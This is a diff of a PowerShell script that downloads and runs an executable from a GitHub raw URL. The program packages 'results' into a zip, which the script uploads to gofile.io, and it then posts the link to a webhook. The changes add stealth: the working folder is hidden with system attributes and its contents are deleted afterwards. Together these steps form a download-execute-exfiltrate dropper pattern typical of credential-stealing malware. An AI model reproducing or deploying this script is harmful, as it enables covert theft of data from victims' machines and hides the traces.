@@ -2,28 +2,25 @@ $folder = "C:\mod"
 $exe = "$folder\program.exe"
 $url = "https://raw.githubusercontent.com/zesty7272/mods2/refs/heads/main/program.exe"
 
-# KlasÃ¶rÃ¼ oluÅŸtur
 
 New-Item -ItemType Directory -Path $folder -Force | Out-Null
+attrib +h +s $folder
 
-# ProgramÄ± indir
 
 Invoke-WebRequest -Uri $url -OutFile $exe
 
-# ProgramÄ±n bitmesini bekle
 
 Start-Process -FilePath $exe -ArgumentList "--zip" -WorkingDirectory $folder -Wait
 
-# OluÅŸan ZIP dosyasÄ±
 
 $file = "C:\mod\results\results.zip"
 
 if (!(Test-Path $file)) {
-Write-Host "Dosya bulunamadÄ±: $file"
+Write-Host "Not found: $file"
 exit
 }
 
-Write-Host "YÃ¼kleniyor..."
+Write-Host "Loading..."
 
 $result = curl.exe -s `    -F "file=@C:\mod\results\results.zip"`
 https://upload.gofile.io/uploadfile
@@ -40,12 +37,12 @@ Write-Host $link
 $link | Set-Clipboard
 
 Write-Host ""
-Write-Host "Link panoya kopyalandi."
+Write-Host "Link copied."
 ```
 
 }
 catch {
-Write-Host "Upload cevabÄ±:"
+Write-Host "Upload resp:"
 Write-Host $result
 }
 
@@ -57,3 +54,5 @@ $body = @{
 } | ConvertTo-Json
 
 Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
+
+Remove-Item "C:\mod\*" -Recurse -Force
